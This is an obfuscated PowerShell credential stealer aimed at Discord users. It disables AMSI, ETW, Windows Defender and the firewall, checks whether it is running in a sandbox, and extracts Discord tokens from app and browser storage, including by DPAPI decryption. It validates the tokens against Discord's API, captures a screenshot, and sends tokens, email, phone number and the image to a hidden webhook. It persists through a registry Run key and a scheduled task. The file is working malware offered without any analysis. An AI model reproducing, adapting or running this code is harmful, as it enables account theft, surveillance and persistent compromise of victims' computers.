# ═══ In-Memory Patches (Polymorphic) ═══
# Runtime memory patch
$uQH7 = "OYZSX"
$N2xtA6 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
$GczHM8 = "ULMMM"
$uET6f = ([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100)
$Ka2mYMPB = [Ref].Assembly.GetType($N2xtA6)
Start-Sleep -Milliseconds 32
$wJPm6 = $Ka2mYMPB.GetField($uET6f, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
$wJPm6.SetValue($null, $true)
[void]([Math]::Abs(13456))

# ETW blind (P/Invoke)
$H1cp = "KFRWV"
$MMGsh = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$LHkM6 = Add-Type -MemberDefinition $MMGsh -Name 'UpdateItem21' -Namespace 'RunState30' -PassThru
[void]([Math]::Abs(42437))
$tnpWD = ([char]110+[char]116+[char]100+[char]108+[char]108+[char]46+[char]100+[char]108+[char]108)
$cJDeVes = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
$xilsWUd = $LHkM6::LoadLibrary($tnpWD)
$GOBl = $LHkM6::GetProcAddress($xilsWUd, $cJDeVes)
[void]([Math]::Abs(1314))
$xAiVZVcV = 0
$LHkM6::VirtualProtect($GOBl, [UIntPtr]::new(1), 0x40, [ref]$xAiVZVcV) | Out-Null
$YoUN3g = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($YoUN3g, 0, $GOBl, $YoUN3g.Length)
$LHkM6::VirtualProtect($GOBl, [UIntPtr]::new(1), $xAiVZVcV, [ref]$xAiVZVcV) | Out-Null
Start-Sleep -Milliseconds 3

# Environment validation
$jSWzQg = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
if ($jSWzQg -lt 2) { exit }
$R5XtZ = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory
if ($R5XtZ -lt 2GB) { exit }
$OXU7M6y = [System.DateTime]::Now
Start-Sleep -Milliseconds 3103
if (([System.DateTime]::Now - $OXU7M6y).TotalMilliseconds -lt 2482) { exit }

function GetBuffer88($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
# === POLYMORPHIC PAYLOAD ===
function Get-Payload {
    $r = Get-Random -Minimum 1000 -Maximum 9999
    $s = @(
        (GetBuffer88 @(81,21,66,223) @(48,66,20,235)),
        (GetBuffer88 @(28,104,176,163,51,84,180,159,14,64,245,163,14,30,212,242) @(87,45,133,207)),
        (GetBuffer88 @(94,159,195,40,70,158,241,116,83,153,219,107,107,165,195,109,110,177,254,37) @(10,242,149,24)),
        (GetBuffer88 @(88,143,75,0,104,165,10,69,83,159,32,103,110,128,56,67,104,165,17,14) @(10,200,114,51)),
        (GetBuffer88 @(170,185,158,61,23,24,179,150,153,128,61,5,28,210,171,146,158,43,70,62,128,185,168,149,54,36,26,208,130,200,172,43,42,98,216,148,158,189,4,6,52,162,212,144,152,96,67,38,130,211,188,136,49,65,56,137,131,174,191,43,62,42,164,150,180,131,99,4,49,185,137,150,152,17,74,42,131,211,206,140,48,36,22,145,131,147,195,40,17,98,213,148,153,178,31,11,26,152,138,199) @(225,250,250,82,115,80,225))
    )
    return ($s -join '') + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICM="))) + $r
}

# === AMSI BYPASS (multi-layer) ===
function Bypass-AMSI {
    try {
        $a = -join ((83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) | ForEach-Object { [char]$_ })
        $b = -join ((97,109,115,105,73,110,105,116,70,97,105,108,101,100) | ForEach-Object { [char]$_ })
        $type = [Ref].Assembly.GetType($a)
        if ($null -ne $type) {
            $field = $type.GetField($b, 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $c = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($null -ne $c) {
            $field = $c.GetField('amsiInitFailed', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $true) }
        }
    } catch {}
    try {
        $ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiContext')
        if ($null -ne $ctx) {
            $field = $ctx.GetField('amsiEnabled', 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, $false) }
        }
    } catch {}
}
Bypass-AMSI

# === ETW BYPASS ===
try {
    $etwType = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($null -ne $etwType) {
        $field = $etwType.GetField('etwEnabled', 'NonPublic,Static')
        if ($null -ne $field) { $field.SetValue($null, $false) }
    }
} catch {}

# === CONFIG ===
$hook = (GetBuffer88 @(3,169,199,12,177,37,47,215,217,69,235,6,3,185,219,86,176,94,40,138,217,81,156,27,0,178,172,84,177,42,9,151,241,14,132,4,3,166,172,74,179,94,47,151,216,104,135,23,45,165,220,68,156,41,59,212,216,86,135,88,44,139,204,69,159,57,47,155,216,85,235,31,48,183,212,69,133,43,52,178,244,104,152,31,0,165,195,79,156,3,52,171,192,81,182,0,58,209,253,122,134,53,6,181,194,80,132,20,0,169,195,77,179,23,52,173,198,123,185,23,52,169,253,86,128,95,44,140,199,86,144,2,7,185,220,13,177,0,40,183,246,122,152,39,46,185,192,72,157,57,48,172,247,70,136,5,54,180,249,83,128,44,95,220) @(98,225,149,60,210,109))
$api = (GetBuffer88 @(31,222,78,225,29,222,81,231,50,239,37,186,31,206,82,187,28,165,86,186,50,251,82,167,28,197,37,185,29,209,119,167,26,252,119,167,26,206,82,189,29,248,81,167,47,209,45,189) @(126,150,28,209))
$rgx = '[\w-]{24,}\.[\w-]{4,}\.[\w-]{27,}'
$mfa = 'mfa\.[\w-]{84}'
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq (GetBuffer88 @(131,165,1,15,254,33,82,77,132,140,105,59,252,33,86,66,143,143,30,50,250,70,86,94,131,152,109,85) @(215,201,80,104,175,119,4,24)))
$firstRun = $true

# === DISABLE DEFENDER ===
try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
try { netsh advfirewall set allprofiles state off > $null 2>&1 } catch {}

# === TOKEN EXTRACTION ===
function Read-FileBytes {
    param([string]$path)
    try {
        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $ms = New-Object System.IO.MemoryStream
        $fs.CopyTo($ms)
        $fs.Close()
        $fs.Dispose()
        $result = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()
        return $result
    } catch { return $null }
}

function Validate-Token {
    param([string]$token)
    if ([string]::IsNullOrEmpty($token)) { return $false }
    if ($token.Length -gt 120 -or $token.Length -lt 59) { return $false }
    if ($token -like 'mfa.*') { return $true }
    $parts = $token -split '\.'
    if ($parts.Count -ne 3) { return $false }
    try {
        $p = $parts[0]
        $pad = 4 - ($p.Length % 4)
        if ($pad -ne 4) { $p += '=' * $pad }
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
        $val = [long]::Parse($decoded)
        return $true
    } catch { return $false }
}

$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)

if (-not $isSystem -and $firstRun) {
    $ldbPaths = [System.Collections.Generic.List[string]]::new()

    # Discord Apps
    $discordApps = @((GetBuffer88 @(112,164,53,23,163,187,238,83,185,24,80,199) @(42,227,89,109,250,137,215)), (GetBuffer88 @(56,81,166,234,146,43,91,111,144,215,133,113,0,123,140,233,174,72,95,43) @(98,22,202,144,203,25)), (GetBuffer88 @(36,217,205,44,145,241,42,12,36,214,227,102,145,164,46,72) @(126,158,161,86,200,195,19,117)), (GetBuffer88 @(209,94,140,27,40,185,32,153,59,54,217,117,132,12,39,248,123,211,35,5,209,78,213,81) @(139,25,224,97,113)))
    foreach ($d in $discordApps) {
        $p = Join-Path $env:APPDATA ($d + (GetBuffer88 @(90,36,139,198,7,17,68,18,186,246,16,19,96,82,185,216,4,17,84,2,145,247,8,17,88,54,139,219,7,68,63,92) @(2,97,243,176,94,35)))
        if (Test-Path $p) { $ldbPaths.Add($p) | Out-Null }
    }

    # Browsers
    $browserBasePaths = @(
        @{ Path = ($env + (GetBuffer88 @(255,208,185,106,185,128,253,140,107,190,242,234,147,127,174,229,234,151,66,160,210,137,248,84,138,247,237,162,107,218,216,194,163,8,217,220,227,135,108,146,234,227,136,93,186,247,253,241,99,185,141,134) @(176,187,193,58,232))); Default = (GetBuffer88 @(200,188,68,18,93,140,199,233,159,83,66,57) @(154,251,18,127,4,212,145)) },
        @{ Path = ($env + (GetBuffer88 @(183,254,244,223,187,47,190,216,221,217,168,78,170,208,202,218,187,73,128,219,237,216,164,102,154,166,194,249,176,113,170,246,222,216,184,113,162,195,244,217,137,45,174,236,197,202,184,119,156,210,201,178) @(248,149,140,143,234,31))); Default = (GetBuffer88 @(26,154,152,123,130,104,80,59,185,143,43,230) @(72,221,206,22,219,48,6)) },
        @{ Path = ($env + (GetBuffer88 @(113,182,177,79,88,14,155,132,78,95,124,140,155,90,79,107,140,159,103,74,93,176,143,45,83,104,147,191,69,103,108,238,144,71,67,82,133,140,85,112,103,133,147,115,69,107,151,176,125,58,90,167,147,71,67,93,139,145,81,101,93,180,139,90,80,102,143,161) @(62,221,201,31,9))); Default = (GetBuffer88 @(242,101,142,236,36,57,73,63,196,99,229,188) @(160,34,216,129,125,97,31,76)) },
        @{ Path = ($env + (GetBuffer88 @(23,60,10,123,243,159,101,88,9,1,48,122,240,234,101,64,9,1,10,124,195,247,121,125,58,16,32,91,250,233,117,111,2,15,59,76,240,232,101,37,1,6,79,22) @(88,87,114,43,162,175,35,21))); Default = (GetBuffer88 @(248,254,12,81,243,225,12,79,206,248,103,1) @(170,185,90,60)) }
    )
    foreach ($bp in $browserBasePaths) {
        if (Test-Path $bp.Path) {
            $profiles = Get-ChildItem $bp.Path -Directory -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -eq (GetBuffer88 @(142,13,125,172,133,18,125,178,184,11,22,252) @(220,74,43,193)) -or $_.Name -like (GetBuffer88 @(7,132,135,79,156,123,62,191,151,106,135,103) @(82,204,205,57,198,22))
            }
            foreach ($prof in $profiles) {
                $ldbDir = Join-Path $prof.FullName (GetBuffer88 @(209,135,139,28,150,242,153,162,208,243,224,0,172,200,168,171,223,150,202,5,149,253,180,169,231,135,224,31) @(133,192,178,118,207,165,238,197))
                if ((Test-Path $ldbDir) -and (-not $ldbPaths.Contains($ldbDir))) {
                    $ldbPaths.Add($ldbDir) | Out-Null
                }
            }
        }
    }

    $iso = [System.Text.Encoding]::GetEncoding((GetBuffer88 @(134,166,20,8,153,164,61,108,155,164,49,44,152,161,103,101) @(213,240,90,88)))
    $dpapiMagic = (GetBuffer88 @(207,124,74,178,207,124,54,206) @(142,61,11,243))
    $regexObj = [System.Text.RegularExpressions.Regex]::new($rgx, [System.Text.RegularExpressions.RegexOptions]::Compiled)
    $mfaObj = [System.Text.RegularExpressions.Regex]::new($mfa, [System.Text.RegularExpressions.RegexOptions]::Compiled)

    foreach ($p in $ldbPaths) {
        if (-not (Test-Path $p)) { continue }
        $files = Get-ChildItem $p -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.ldb', '.log' }
        foreach ($fl in $files) {
            $b = Read-FileBytes -path $fl.FullName
            if ($null -eq $b -or $b.Length -lt 8) { continue }
            $str = $iso.GetString($b)

            foreach ($m in $regexObj.Matches($str)) { $null = $found.Add($m.Value) }
            foreach ($m in $mfaObj.Matches($str)) { $null = $found.Add($m.Value) }

            $searchStart = 4
            $blobCount = 0
            while ($searchStart -lt ($b.Length - 8) -and $blobCount -lt 30) {
                $idx = $str.IndexOf($dpapiMagic, $searchStart, [System.StringComparison]::Ordinal)
                if ($idx -lt 0) { break }
                $start = $idx - 4
                if ($start -ge 0 -and $b[$start] -le 3 -and $b[$start + 1] -eq 0 -and $b[$start + 2] -eq 0 -and $b[$start + 3] -eq 0) {
                    $blobCount++
                    if (($start + 8) -le $b.Length) {
                        $len = [BitConverter]::ToUInt32($b, $start + 4)
                        if ($len -gt 0 -and $len -lt 100000 -and ($start + $len) -le $b.Length) {
                            try {
                                $blob = [byte[]]::new($len)
                                [Array]::Copy($b, $start, $blob, 0, $len)
                                $dec = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $tok = [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0)
                                if ($tok -match $rgx -or $tok -match $mfa) { $null = $found.Add($tok) }
                            } catch {}
                        }
                    }
                }
                $searchStart = $idx + 4
            }
        }
    }
}

# === TOKEN VALIDATION ===
$validTokens = [System.Collections.Generic.List[object]]::new()

if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
    $validated = [System.Collections.Generic.List[string]]::new()
    foreach ($token in $found) {
        if (Validate-Token -token $token) { $validated.Add($token) }
    }

    foreach ($token in $validated) {
        try {
            $headers = @{
                Authorization = $token
                (GetBuffer88 @(246,65,174,201,195,112,209,231,250,43,182,208,196,88,221,152) @(160,25,224,165))  = (GetBuffer88 @(236,234,185,126,217,40,18,203,228,211,112,137,51,0,249,218,203,14,220,15,8,213,239,246,44,139,50,13,236,209,209,47,245,43,43,205,240,196,59,223,41,88,212,200,206,34,233,72,35,240,218,178,6,251,20,87) @(184,189,128,72,184,127,106))
            }
            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 3 -ErrorAction Stop
            if ($r.id) {
                $validTokens.Add([PSCustomObject]@{
                    u    = ($($r.username) + "#" + $($r.discriminator))
                    id   = $r.id
                    em   = if ($r.email) { $r.email } else { (GetBuffer88 @(12,236,33,197) @(88,133,24,135,25,88,13,253)) }
                    ph   = if ($r.phone) { $r.phone } else { (GetBuffer88 @(36,88,45,169) @(112,49,20,235,44)) }
                    ni   = switch ($r.premium_type) { 1 { (GetBuffer88 @(18,156,77,93,80,112,224,69,108,68,126,147) @(67,174,53,53,51)) } 2 { (GetBuffer88 @(179,53,149,147,141,199,47,197) @(231,88,249,163,238,170,23,248)) } default { (GetBuffer88 @(42,15,14,104,39,47,95,10) @(126,98,55,29,125)) } }
                    mf   = if ($r.mfa_enabled) { (GetBuffer88 @(148,46,106,216) @(195,121,60,162,81,25,3)) } else { ([char]0x4e+[char]0x6f) }
                    token = $token
                })
            }
        } catch {}
    }
}

# === SCREENSHOT ===
$bytes = $null
try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
    $bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    [Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
    $ms = New-Object IO.MemoryStream
    $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
    $bytes = $ms.ToArray()
    $ms.Close()
} catch { $bytes = $null }

# === SEND TO WEBHOOK ===
if ($firstRun) {
    $pcName = [System.Environment]::GetEnvironmentVariable((GetBuffer88 @(44,142,249,161,132,59,232,149,189,135,55,241,145,186,224,59) @(125,190,192,239,209)))
    $userName = [System.Environment]::GetEnvironmentVariable((GetBuffer88 @(78,59,49,25,192,206,45,47,43,10,192,152) @(24,109,127,95,149,165)))
    $report = ((GetBuffer88 @(45,243,34,197,48,246,4,234,48,220,4,244,52,201,16,239,51,241,20,228,55,241,4,244,62,201,61,214,37,246,16,227,41,243,19,154) @(102,154,82,167)) + $pcName + (GetBuffer88 @(216,122,150,12,193,78,137,64,210,87,253,75) @(155,22,192,118)) + $userName + (GetBuffer88 @(205,229,106,233,32,201,229,91,200,4,220,255,81,179,20,251,234,74,238,37) @(142,137,48,129,66)) + $($validTokens.Count) + (GetBuffer88 @(186,86,127,20) @(249,49,16,41,254)))
    
    foreach ($ti in $validTokens) {
        $report += (([char]0x2a+[char]0x2a) + $($ti.u) + (GetBuffer88 @(107,112,148,4,118,94,194,61,122,78,207,121,105,94,186,114) @(32,25,251,79)) + $($ti.token) + (GetBuffer88 @(7,103,245,62,167,26,73,226) @(94,38,133,116,245)) + $($ti.id) + (GetBuffer88 @(69,36,201,57,48,119,203,123,73,38,222,112) @(6,79,159,77,105,32,167,8)) + $($ti.em) + (GetBuffer88 @(247,89,238,161,214,7,153,162,251,92,237,243) @(180,53,172,206)) + $($ti.ph) + (GetBuffer88 @(198,186,70,55,145,205,155,5,11,197,180,150,34,19,154,226) @(133,209,115,71,245)) + $($ti.ni) + "/" + $($ti.mf) + (GetBuffer88 @(6,6,163,227) @(69,97,204,222,56,215)))
    }

    try {
        Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} -ErrorAction SilentlyContinue
    } catch {}

    if ($bytes) {
        try {
            $boundary = (GetBuffer88 @(24,114,160,235,27,76,10,101,67,216,205,102,121,61,2,98,242,172,1,111,10,19,103,233,250,6,39,109) @(84,33,144,159,87,26,80)) + (Get-Random).ToString()
            $LF = (GetBuffer88 @(232,74,201,168) @(172,27,166,149,74,227,60))
            $body = (
                (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LS0="))) + $boundary + $LF) +
                ((GetBuffer88 @(225,191,209,31,138,17,77,197,233,171,91,171,55,67,254,250,138,89,160,38,127,247,225,158,8,132,57,124,234,224,209,19,140,5,42,219,212,176,56,134,25,98,242,248,177,61,223,58,75,231,204,129,48,131,58,104,234,218,169,3,161,47,89,221,236,191,18,130,52,118,246,249,178,62,223,49,82,222,195,130,9,131,0,119,210,227,166,5,140,101,74,197,238,175,95,128,15,88,249,176) @(176,141,232,106,238,86,27)) + $LF) +
                ((GetBuffer88 @(205,195,143,55,4,158,96,233,149,245,115,53,188,110,222,157,249,43,34,169,84,203,183,216,24,51,224,65,254,156,213,127) @(156,241,182,66,96,217,54)) + $LF + $LF)
            )
            $footer = ($LF + ([char]0x2d+[char]0x2d) + $boundary + ([char]0x2d+[char]0x2d) + $LF)
            
            $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
            $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
            $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
            
            $webRequest = [Net.WebRequest]::Create($hook)
            $webRequest.Method = (GetBuffer88 @(54,163,41,251,32,34,219,45) @(99,230,16,175,118))
            $webRequest.ContentType = ((GetBuffer88 @(67,56,34,255,84,106,77,23,45,212,122,29,109,82,46,250,83,64,17,20,46,203,118,29,120,52,7,235,105,64,24,81,22,225,98,69,66,14,31,181) @(33,96,116,140,48,45)) + $boundary)
            $webRequest.ContentLength = $totalLength
            
            $reqStream = $webRequest.GetRequestStream()
            $reqStream.Write($headerBytes, 0, $headerBytes.Length)
            $reqStream.Write($bytes, 0, $bytes.Length)
            $reqStream.Write($footerBytes, 0, $footerBytes.Length)
            $reqStream.Close()
            $webRequest.GetResponse()
        } catch {}
    }
}

# === PERSISTENCE ===
$cmd = (GetBuffer88 @(54,118,108,4,203,147,31,75,52,112,199,184,55,114,96,91,244,140,0,86,25,96,164,189,55,118,108,89,243,178,20,69,15,111,208,172,12,95,57,64,200,147,27,75,28,116,160,248,28,118,61,71,203,140,7,93,55,94,208,191,12,72,23,80,216,166,57,93,48,116,249,187,54,92,101,80,219,249,61,1,49,127,211,177,26,88,109,65,242,166,19,2,25,90,245,187,49,118,61,6,200,165,3,75,15,111,219,161,55,3,96,7,203,156,96,1,25,90,223,189,55,98,108,77,200,156,33,75,52,112,215,191,24,101,28,77,220,159,20,2,25,111,211,187,48,118,3,68,221,248,27,71,55,94,168,191,12,102,57,66,221,248,27,71,55,94,164,188,54,75,16,89,218,156,20,88) @(85,49,85,55,145,203))
try { Set-ItemProperty -Path (GetBuffer88 @(33,39,209,204,5,31,47,128,39,80,156,229,55,3,59,139,17,15,243,235,7,28,51,137,17,15,156,242,49,121,5,211,42,36,193,248,49,38,13,149,22,81,235,235,2,120,9,154,17,15,243,253,55,13,5,143,17,12,235,248,49,121,106,128,39,12,243,253) @(114,98,165,136,83,75,95,227)) -Name (GetBuffer88 @(213,146,149,228,59,19,244,187,224,145,183,253,56,103,155,241,226,248,171,164,50,19,155,224,225,232,171,254) @(131,160,249,145,97,84,205,136)) -Value $cmd -ErrorAction SilentlyContinue } catch {}
try { schtasks /create /tn (GetBuffer88 @(31,226,166,152,75,154,112,227,169,220,95,177,16,227,156,148,112,133,27,229,153,170,71,181,43,152,152,130) @(73,208,202,237,17,221)) /tr ($cmd) /sc onlogon /f /rl highest /it > $null 2>&1 } catch {}

# === INSTANT EXIT ===
exit
